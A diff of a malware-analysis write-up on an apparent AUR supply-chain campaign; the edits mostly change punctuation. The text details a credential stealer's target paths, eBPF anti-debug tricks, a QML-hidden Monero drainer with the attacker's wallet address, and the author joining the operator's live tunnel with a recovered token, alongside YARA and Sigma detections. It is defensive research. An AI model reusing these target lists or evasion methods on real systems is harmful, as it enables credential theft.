-DNS in the installer phase: `registry.npmjs.org` and `api.github.com` from the stealer. Two more names in that capture, `api.snapcraft.io` and `ntp.ubuntu.com`, are not the malware, they are the guest's own background daemons, and it is worth not misattributing them. The binary has no Snap Store API surface at all (no `api.snapcraft.io`, `snapd`, `macaroon`, `snap-store`, or `login.ubuntu.com` strings); the only `snap/` paths it carries are app-config directories it reads credentials out of (`snap/slack/current/.config/Slack`, `snap/telegram-desktop/current/.../tdata`). So the `api.snapcraft.io` hit is Ubuntu's `snapd` doing its routine store poll, and the `sslv3_alert_bad_certificate` it threw is `snapd` verifying the sink's MITM leaf and rejecting it. That rejection is the useful tell, not a malware capability: `snapd` is a properly verifying TLS client, so the sink could not fool it, which is the exact opposite of the stealer's own no-op-verifier rustls path two sections up that decrypted without complaint. Persistence drops a copy of itself and wires it to systemd:
+DNS in the installer phase: `registry.npmjs.org` and `api.github.com` from the stealer. Two more names in that capture, `api.snapcraft.io` and `ntp.ubuntu.com`, are not the malware, they are the guest's own background daemons, and it is worth not misattributing them. The binary has no Snap Store API surface at all (no `api.snapcraft.io`, `snapd`, `macaroon`, `snap-store`, or `login.ubuntu.com` strings). The only `snap/` paths it carries are app-config directories it reads credentials out of (`snap/slack/current/.config/Slack`, `snap/telegram-desktop/current/.../tdata`). So the `api.snapcraft.io` hit is Ubuntu's `snapd` doing its routine store poll, and the `sslv3_alert_bad_certificate` it threw is `snapd` verifying the sink's MITM leaf and rejecting it. That rejection is the useful tell, not a malware capability: `snapd` is a properly verifying TLS client, so the sink could not fool it, which is the exact opposite of the stealer's own no-op-verifier rustls path two sections up that decrypted without complaint. Persistence drops a copy of itself and wires it to systemd:
 
 ```
 drop:        /var/lib/moge/moge   mode 0700        (8-char name randomized per host; also seen hite, ledodo, trakevu)
@@ -1020,13 +1020,13 @@ $ grep openat agent_trace.txt | grep -oE '/home/dev/\S+|/etc/\S+' | sort -u
 /home/dev/.config/discord/Local Storage/leveldb/      ...                    (49 paths in total)
 ```
 
-That is the whole target list in one sweep: cloud (`aws`, `gcloud`, `kube`, `k3s`), publishing (`gh/hosts.yml`, `npmrc`, `pypirc`), keys (`ssh`), wallets (`seed.txt`, `wallet.txt`, `vault-token`), and chat (`Slack`, `discord`) cookie stores. The `dev` user's home was the canary I planted; the malware walked it from `/etc/passwd`, exactly the gap that makes a `$HOME` override useless as isolation.
+That is the whole target list in one sweep: cloud (`aws`, `gcloud`, `kube`, `k3s`), publishing (`gh/hosts.yml`, `npmrc`, `pypirc`), keys (`ssh`), wallets (`seed.txt`, `wallet.txt`, `vault-token`), and chat (`Slack`, `discord`) cookie stores. The `dev` user's home was the canary I planted. The malware walked it from `/etc/passwd`, exactly the gap that makes a `$HOME` override useless as isolation.
 
 A crash is not a benign result, by the way. The first few times it SIGILL'd I had to resist writing "no malicious behavior observed." No behavior was observed because the process died on instruction four, not because it was clean. Gate your conclusions on the thing actually having run.
 
 ## the detonation lab {#lab}
 
-The traces above came out of a lab built around one rule: the malware never touches a real network, a real credential, or a path back to the host. Static analysis tells you what the code can do; this is how I watched what it actually does without giving it anything real to do it to. The isolation choices are the whole difference between a result and an incident, so here is the rig.
+The traces above came out of a lab built around one rule: the malware never touches a real network, a real credential, or a path back to the host. Static analysis tells you what the code can do. This is how I watched what it actually does without giving it anything real to do it to. The isolation choices are the whole difference between a result and an incident, so here is the rig.
 
 The shape of it. A throwaway QEMU/KVM guest (Ubuntu 24.04 cloud image) runs on an ephemeral qcow2 overlay over a read-only base, so every run starts from the same clean state and nothing survives poweroff. No host filesystem is mounted into the guest, which is the lesson from the namespace harness that failed earlier in this investigation. QEMU's `-netdev user,restrict=on` is a hard no-egress backstop: even if something inside tries to reach the internet, the packets die at the virtual NIC. Inside the guest, every outbound TCP is redirected to a local sink and DNS is answered by a fake resolver pointing everything at `127.0.0.1`. The sample runs believing it is online. Nothing leaves.
 
@@ -1118,7 +1118,7 @@ else                      echo "FAIL BEACON agent bailed pre-network"
 fi
 ```
 
-Here is the actual `TEST_REPORT.txt` from one run (`vmtest_1781526796`; on the beacon line I trimmed the per-entry ISO timestamps and the repeated `orig_dst 127.0.0.1:443`, otherwise verbatim):
+Here is the actual `TEST_REPORT.txt` from one run (`vmtest_1781526796`, beacon line trimmed: per-entry ISO timestamps and the repeated `orig_dst 127.0.0.1:443` stripped, otherwise verbatim):
 
 ```
 PASS  DROP self-install -> /var/lib/moge/moge (3040376b, sha256 6144d433f8a03168)
@@ -1148,9 +1148,9 @@ $ echo $?
 
 So the anti-debug is not theoretical. All thirteen tracepoint programs attach, and the instant `strace` seizes the agent the rootkit's `sys_enter_ptrace` program fires `bpf_send_signal(9)` and the tracer dies with code 137. That kill is gated on the target being in `hidden_pids`, so its firing also proves the agent had already added its own pid to the hide list: the maps are populated and live, not just pinned.
 
-The file and socket hiding is the honest other half. In the same run the drop dir stayed visible to `ls /var/lib` and the agent's pid stayed visible in `/proc`. The split is mechanical. The kill uses `bpf_send_signal`, which a modern kernel allows; the hiding rewrites the buffer the kernel already returned to userspace with `bpf_probe_write_user`, which a stock kernel with the lockdown LSM loaded restricts. I did not capture a kernel taint line pinning the cause to `bpf_probe_write_user` specifically, so I state only what I observed: the anti-debug SIGKILL is live and demonstrated, the getdents and `/proc` hiding did not take effect on this kernel, and both are driven off the same populated hide-list. On a kernel that permits the userspace write the same programs would hide. Here the most dangerous one, the debugger kill, is the one that works.
+The file and socket hiding is the honest other half. In the same run the drop dir stayed visible to `ls /var/lib` and the agent's pid stayed visible in `/proc`. The split is mechanical. The kill uses `bpf_send_signal`, which a modern kernel allows. The hiding rewrites the buffer the kernel already returned to userspace with `bpf_probe_write_user`, which a stock kernel with the lockdown LSM loaded restricts. I did not capture a kernel taint line pinning the cause to `bpf_probe_write_user` specifically, so I state only what I observed: the anti-debug SIGKILL is live and demonstrated, the getdents and `/proc` hiding did not take effect on this kernel, and both are driven off the same populated hide-list. On a kernel that permits the userspace write the same programs would hide. Here the most dangerous one, the debugger kill, is the one that works.
 
-The wallet second stage needed the two extra props from the wall list above: Intel SDE (`sde64 -spr`) to emulate the `-march=native` AVX-512 the build assumes, and software GL (`QT_QUICK_BACKEND=software`, `LIBGL_ALWAYS_SOFTWARE=1`, `GALLIUM_DRIVER=llvmpipe`) so the Qt GUI comes up headless. In this unattended run it stops at the setup wizard; a later human-in-the-loop run scripted past the wizard and ran into the deeper Monero wallet bug ([#8600](https://github.com/monero-project/monero/issues/8600)) covered in the detonation section above. What little did run before the wizard is itself a data point for the native-stock finding: it came up as Qt 5.15.19 on an 800x600 software surface and made one stock Monero DNS lookup, `updates.moneropulse.org` (the `checkpoints.moneropulse.org` host is a stock string in the binary but the run stops at the wizard before reaching it), with no operator domain, no onion, no TCP beacon, no eBPF, and no clipboard activity. The malice never executes in either run because it lives in the QML the sync callback runs after a funded, credited wallet is loaded, which the wizard never reaches here and #8600 prevents on the regtest chain. The captured DNS is the proof, not my say-so:
+The wallet second stage needed the two extra props from the wall list above: Intel SDE (`sde64 -spr`) to emulate the `-march=native` AVX-512 the build assumes, and software GL (`QT_QUICK_BACKEND=software`, `LIBGL_ALWAYS_SOFTWARE=1`, `GALLIUM_DRIVER=llvmpipe`) so the Qt GUI comes up headless. In this unattended run it stops at the setup wizard. A later human-in-the-loop run scripted past the wizard and ran into the deeper Monero wallet bug ([#8600](https://github.com/monero-project/monero/issues/8600)) covered in the detonation section above. What little did run before the wizard is itself a data point for the native-stock finding: it came up as Qt 5.15.19 on an 800x600 software surface and made one stock Monero DNS lookup, `updates.moneropulse.org` (the `checkpoints.moneropulse.org` host is a stock string in the binary but the run stops at the wizard before reaching it), with no operator domain, no onion, no TCP beacon, no eBPF, and no clipboard activity. The malice never executes in either run because it lives in the QML the sync callback runs after a funded, credited wallet is loaded, which the wizard never reaches here and #8600 prevents on the regtest chain. The captured DNS is the proof, not my say-so:
 
 ```
 $ awk '{print $3}' wallet_v1/dns.log | grep -v '^$' | LC_ALL=C sort | uniq -c
@@ -1218,7 +1218,7 @@ I did the diligent native-layer comparison. I pulled the stock `monero-wallet-gu
   execve@GLIBC_2.2.5
   ```
 - RTTI and type names: the sample is a strict superset of stock, and the extra entries are retained debug info for legitimate Monero internals. Zero stock symbols missing.
-- Embedded URLs: every http(s) URL in the sample is also in stock (the getmonero hosts plus standard XML-namespace URLs from Qt and the like); not one operator URL is added. The only code-level change is a p2pool dependency bump from v4.15 to v4.15.1, a real upstream release: the binary carries the expected-download SHA-256 `efd8b23579774711a5b86743da980e0936b7c220894063296719116d7f9ba254` next to the official `github.com/monero-project/p2pool/releases/download/v4.15.1/` URL, so the bump is genuine, not a swapped-in trojan p2pool.
+- Embedded URLs: every http(s) URL in the sample is also in stock (the getmonero hosts plus standard XML-namespace URLs from Qt and the like). Not one operator URL is added. The only code-level change is a p2pool dependency bump from v4.15 to v4.15.1, a real upstream release: the binary carries the expected-download SHA-256 `efd8b23579774711a5b86743da980e0936b7c220894063296719116d7f9ba254` next to the official `github.com/monero-project/p2pool/releases/download/v4.15.1/` URL, so the bump is genuine, not a swapped-in trojan p2pool.
 
   ```
   $ strings v1 | grep -cF 'p2pool/releases/download/v4.15.1/'                                # the official URL
@@ -1399,7 +1399,7 @@ if (walletSynced && currentWallet && !currentWallet.viewOnly) {
 That is the whole payload. Twelve lines of QML. It is a Monero wallet drainer: when a synced, spendable wallet holding more than 1 XMR is opened, it sweeps the entire balance to `865BH8r1M2Ni6nckpNr357dqDYCC4VkoyeX7EReDmAkYWDnS646BgXeLmH8zcPr7ENbC9ZjzEXyD6ZDkYbfMjefx4aBZF8C` and auto-broadcasts, with no dialog and no second chance.
 {:.callout-key}
 
-On whether this is a new technique, because it is worth being honest about: hiding the payload in the QML resource layer is a new carrier for an old idea, not a new idea. Trojanizing the interpreted or resource layer of an app to slip past native-code analysis is well-precedented. Backdoored Electron apps hide JavaScript inside the [`app.asar` archive](https://www.intego.com/mac-security-blog/osx-amos-hunting-c2s-in-trojanized-electron-asar-payloads/), sometimes tampering with the ASAR header to fool static parsers; Lua-based loaders like [LucidRook](https://blog.talosintelligence.com/new-lua-based-malware-lucidrook/) keep their logic in bundled scripts behind a thin native stub. The closest cousin in intent is the [2019 GetMonero compromise](https://web.getmonero.org/2019/11/19/warning-compromised-binaries.html), which injected wallet-theft logic into a legitimate Monero build, except it did so in native C++, which is exactly what binary diffing was built to catch. What I did not find a public prior example of is this done in Qt QML specifically. So the new part is the substrate, not the method: the same resource-layer evasion, in a carrier that had not been written up.
+On whether this is a new technique, because it is worth being honest about: hiding the payload in the QML resource layer is a new carrier for an old idea, not a new idea. Trojanizing the interpreted or resource layer of an app to slip past native-code analysis is well-precedented. Backdoored Electron apps hide JavaScript inside the [`app.asar` archive](https://www.intego.com/mac-security-blog/osx-amos-hunting-c2s-in-trojanized-electron-asar-payloads/), sometimes tampering with the ASAR header to fool static parsers. Lua-based loaders like [LucidRook](https://blog.talosintelligence.com/new-lua-based-malware-lucidrook/) keep their logic in bundled scripts behind a thin native stub. The closest cousin in intent is the [2019 GetMonero compromise](https://web.getmonero.org/2019/11/19/warning-compromised-binaries.html), which injected wallet-theft logic into a legitimate Monero build, except it did so in native C++, which is exactly what binary diffing was built to catch. What I did not find a public prior example of is this done in Qt QML specifically. So the new part is the substrate, not the method: the same resource-layer evasion, in a carrier that had not been written up.
 
 And to close the other obvious door: a lot of recent crypto-drainers live in the JS layer, swapping a destination or beaconing out with `fetch`/`XMLHttpRequest`. This one does not. The decompressed JS and QML carry none of those primitives:
 
@@ -1526,7 +1526,7 @@ They share a build-id only because the `.note.gnu.build-id` sits near the start,
 
 There is a second operation hanging off the same actor, separate from the AUR payload. A Node.js project, a fork of the public `eooce/nodejs-argo`, published as a container at `ghcr.io/fardewoak/herbsobering430`. The `index.js` is obfuscator.io output with two layers stacked. The outer layer is the string-array-rotate self-defense: every literal is replaced by a `_0x….(index)` call into one array of 544 entries, and an IIFE at the top spins that array (shift-and-push) until a `parseInt` over a few decoded entries equals a hardcoded magic, so the array only lands in the right order once its own decoder has already run. The inner layer is the per-entry encoding, and despite looking like keyed ciphertext it is just custom-alphabet base64.
 
-Here is what that looks like on disk. The whole file is one physical line; the head is the rotation IIFE and two index-munging wrappers that front the decoder, every literal already gone:
+Here is what that looks like on disk. The whole file is one physical line. The head is the rotation IIFE and two index-munging wrappers that front the decoder, every literal already gone:
 
 ```javascript
 // index.js:1  (obfuscator.io output, one line, wrapped here for reading)
@@ -1599,7 +1599,7 @@ return decodeURIComponent(out);                                                /
 
 A few more mechanics are worth pinning down, because they are what makes "is it RC4" an answer instead of a guess. The array comes from `_0x3da7()` at `index.beautified.js:656`, 544 entries of custom base64 like `E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK`. Every reference runs through one accessor, `_0xdb39(index, key)` at `:2934`, which on its first call installs and memoizes the inner decoder shown above. That second `key` parameter is the thing that fools a quick read: in obfuscator.io's RC4 variant it is the RC4 key that gets XORed into the stream, and here the wrappers pass a value into it and the decode body never reads it. Dead parameter, no S-box, no 256-byte key schedule, no XOR loop. Those absences are what "no RC4" actually means, not a vibe off the look of it.
 
-The number a call site hands the accessor is not the array index either. obfuscator.io stacks an arithmetic indirection on top, so the real lookup is `decode(ARR[(rawIndex - 0x7c + 311) % 544])`, and two wrapper functions sit in front of the accessor doing their own offset math, `_0x2e2cd0(a,b,c,d) = _0xdb39(b - 0x1ad, d)` and `_0xe0c276(a,b,c,d) = _0xdb39(d + 0x3cb, a)`, both ultimately feeding `_0xdb39`. The rotation shift `S = 311` is written nowhere; I recovered it as a free variable, then pinned it by forcing three env-var-name anchors (`UPLOAD_URL`, `PROJECT_URL`, `ARGO_DOMAIN`) to round-trip to their known strings, which only happens at `311`. A Babel pass that folds the wrapper chain and constant-evaluates the indices inlined 1,090 of roughly 1,200 call sites; the ~110 left over are the wrapper definitions themselves, not real references.
+The number a call site hands the accessor is not the array index either. obfuscator.io stacks an arithmetic indirection on top, so the real lookup is `decode(ARR[(rawIndex - 0x7c + 311) % 544])`, and two wrapper functions sit in front of the accessor doing their own offset math, `_0x2e2cd0(a,b,c,d) = _0xdb39(b - 0x1ad, d)` and `_0xe0c276(a,b,c,d) = _0xdb39(d + 0x3cb, a)`, both ultimately feeding `_0xdb39`. The rotation shift `S = 311` is written nowhere. I recovered it as a free variable, then pinned it by forcing three env-var-name anchors (`UPLOAD_URL`, `PROJECT_URL`, `ARGO_DOMAIN`) to round-trip to their known strings, which only happens at `311`. A Babel pass that folds the wrapper chain and constant-evaluates the indices inlined 1,090 of roughly 1,200 call sites. The ~110 left over are the wrapper definitions themselves, not real references.
 
 The reason you cannot shortcut all of this by calling the program's own decoder is the self-defending layer, which is separate from the array rotation. obfuscator.io wraps the file in an anti-tamper guard (`_0x524f3e`, built from the regex pair `\w+ *\(\) *{\w+ *` and `['|"].+['|"];? *}`) that re-checks its own source still looks minified. Beautify or instrument the decoder and the guard trips into a routine that grows an array forever.
 
@@ -1696,7 +1696,7 @@ cloudflared_tunnel_ha_connections 4
 cloudflared_orchestration_config_version 1
 ```
 
-That confirms it: the token is live and accepted. Four high-availability connections registered, and Cloudflare handed back the operator's live ingress map: the single hostname `dcdeploy.jeongyein520.indevs.in` routes to `http://localhost:8001`, which is the xray proxy, with a `404` fallback and no hidden routes. The token's feature set also negotiated `allow_remote_config` and `management_logs`, so the operator can push config and stream logs through Cloudflare; as a connector I can only receive those, not initiate them.
+That confirms it: the token is live and accepted. Four high-availability connections registered, and Cloudflare handed back the operator's live ingress map: the single hostname `dcdeploy.jeongyein520.indevs.in` routes to `http://localhost:8001`, which is the xray proxy, with a `404` fallback and no hidden routes. The token's feature set also negotiated `allow_remote_config` and `management_logs`, so the operator can push config and stream logs through Cloudflare. As a connector I can only receive those, not initiate them.
 
 Then I stood up a listener on `:8001` and watched. Requests that hit my connector carried Cloudflare edge headers, here is one of my own probes coming back through the tunnel:
 
@@ -1714,7 +1714,7 @@ The honest limits of that token: it is tunnel-scoped only. It cannot reach the C
 
 ### what the tunnel was fronting {#xray-config}
 
-With the connector up I could see the full shape of the proxy it routes to. The ingress sends `dcdeploy.jeongyein520.indevs.in` to `http://localhost:8001`, and `:8001` is the public one of five xray inbounds the `generateConfig` routine in the deobfuscated proxy stands up. They share the one fleet UUID; the tunnel routes to `:8001` (VLESS over TCP, `xtls-rprx-vision`), and the rest are localhost fallbacks the connector then exposes:
+With the connector up I could see the full shape of the proxy it routes to. The ingress sends `dcdeploy.jeongyein520.indevs.in` to `http://localhost:8001`, and `:8001` is the public one of five xray inbounds the `generateConfig` routine in the deobfuscated proxy stands up. They share the one fleet UUID. The tunnel routes to `:8001` (VLESS over TCP, `xtls-rprx-vision`), and the rest are localhost fallbacks the connector then exposes:
 
 ```
 xray inbounds (from generateConfig, index.deob.js)
@@ -1777,7 +1777,7 @@ Then I checked those three addresses against the public ledgers, which is passiv
 
 The persona is `fardewoak` (GitHub id 187815981, account created November 2024, `fardewoak@outlook.com`), which is also the namespace on the proxy container. It is a burner. The real identity is gated behind providers I cannot subpoena, so attribution stops at the account level. I am not going to pretend it goes further than that.
 
-A word on who is not behind this, because supply-chain incidents generate misattribution fast. `arojas` is a real KDE maintainer whose name was forged onto commits; a victim of the impersonation, not a participant. The same care applies one campaign back: in the IronWorm wave that this lineage runs through, `ocrybit` (the developer behind the `asteroiddao` / `asteroid-dao` and Arweave/WeaveDB orgs) is the compromised maintainer whose credentials were stolen, JFrog and SC Media are explicit on that, the exact role `arojas` plays here. Exclude `ocrybit`, `asteroiddao`, and the WeaveDB/Arweave maintainers as victims, not operators. The upstream authors whose emails show up in the binaries are innocent too. The proxy tool is a fork of a public project, so the original author's address rides along on inherited commits, and the crypto libraries copied into the decoy carry their real authors' names (OpenSSL's and the Gladman AES author's) baked into compiled routines. Separately, an account called `pingwin840` started adding harmless scareware echo lines to shell rc files on AUR after the incident broke; that is a copycat riding the chaos, not the operator. None of them should be flagged.
+A word on who is not behind this, because supply-chain incidents generate misattribution fast. `arojas` is a real KDE maintainer whose name was forged onto commits, a victim of the impersonation, not a participant. The same care applies one campaign back: in the IronWorm wave that this lineage runs through, `ocrybit` (the developer behind the `asteroiddao` / `asteroid-dao` and Arweave/WeaveDB orgs) is the compromised maintainer whose credentials were stolen, JFrog and SC Media are explicit on that, the exact role `arojas` plays here. Exclude `ocrybit`, `asteroiddao`, and the WeaveDB/Arweave maintainers as victims, not operators. The upstream authors whose emails show up in the binaries are innocent too. The proxy tool is a fork of a public project, so the original author's address rides along on inherited commits, and the crypto libraries copied into the decoy carry their real authors' names (OpenSSL's and the Gladman AES author's) baked into compiled routines. Separately, an account called `pingwin840` started adding harmless scareware echo lines to shell rc files on AUR after the incident broke. That is a copycat riding the chaos, not the operator. None of them should be flagged.
 
 There is also a connective tell between the two stages that I like because it is structural, not circumstantial. Both stages were built on the same box, under the same `/cloud/` tree, with the same toolchain. The strings prove it:
 
@@ -1881,7 +1881,7 @@ rule atomic_arch_stage1_stealer {
 }
 ```
 
-On the stage-one rule, `$bpf` (the `scales.bpf.c` build path) is the high-confidence anchor. `$vault` and `$gpg` are generic enough to fire on legitimate admin tooling, so weight the match toward `$bpf` rather than treating the four strings as equal; I would not alert on `$vault + $gpg` alone. Both rules as a file: [`atomic-arch.yar`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/iocs/atomic-arch.yar).
+On the stage-one rule, `$bpf` (the `scales.bpf.c` build path) is the high-confidence anchor. `$vault` and `$gpg` are generic enough to fire on legitimate admin tooling, so weight the match toward `$bpf` rather than treating the four strings as equal. I would not alert on `$vault + $gpg` alone. Both rules as a file: [`atomic-arch.yar`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/iocs/atomic-arch.yar).
 
 Hash-based detection for the parts that do not need a rule: the embedded eBPF rootkit object is a fixed `sha256 3607de2597f8955f9a88f36ee43b64d3891b8ef536e99fa098e80169350f7b01` in both stealers, and the trojaned `main.qml` decompresses to `sha256 ce8ecab937cf7109f3b344782cd1cbad680d4477965b235b0a59ce888986c4eb` (stock is `5007f0bb9b579176a66430d935192762490df9e87151ceaaa9201491520c4086`).
 
@@ -1941,7 +1941,12 @@ level: medium
 
 All four Sigma rules as a file: [`atomic-arch.sigma.yml`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/iocs/atomic-arch.sigma.yml).
 
-The strongest behavioral tells, in priority order: a write to `/usr/bin/monero-wallet-gui` not attributable to `pacman`/`makepkg`; any pin under `/sys/fs/bpf/*/hidden_*`; a process executing from a random two-segment `/var/lib/<8>/<8>` path with a matching `Restart=always` systemd unit; outbound Tor from a build or developer host; and a non-Vault process reading `~/.vault-token` then connecting to `127.0.0.1:8200`.
+The strongest behavioral tells, in priority order:
+- a write to `/usr/bin/monero-wallet-gui` not attributable to `pacman`/`makepkg`
+- any pin under `/sys/fs/bpf/*/hidden_*`
+- a process executing from a random two-segment `/var/lib/<8>/<8>` path with a matching `Restart=always` systemd unit
+- outbound Tor from a build or developer host
+- a non-Vault process reading `~/.vault-token` then connecting to `127.0.0.1:8200`
 
 ## incident response runbook {#ir}
 
